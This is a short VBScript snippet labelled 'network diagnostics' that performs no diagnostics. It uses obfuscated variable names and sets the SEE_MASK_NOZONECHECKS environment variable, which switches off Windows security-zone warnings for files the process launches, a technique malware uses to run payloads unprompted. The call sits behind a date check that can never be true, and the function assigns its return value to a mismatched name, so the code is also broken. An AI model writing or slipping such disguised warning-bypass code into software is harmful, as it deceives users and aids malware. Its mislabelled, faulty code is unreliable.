' --- network diagnostics ---
Function ParseProfileBlock36()
On Error Resume Next
  Dim blnValid308,strQueue90,strConfig6
  Set blnValid308=CreateObject("WScript.Shell")
  strQueue90=blnValid308.ExpandEnvironmentStrings("%TEMP%")
  strConfig6=blnValid308.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strQueue90)>0 And Len(strConfig6)>0 Then
    blnValid308.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ParseRegistryChunk69=1
    Exit Function
  End If
  ParseRegistryChunk69=0
End Function

If Weekday(Now) > 7 Then
  Call ParseProfileBlock36()
End If


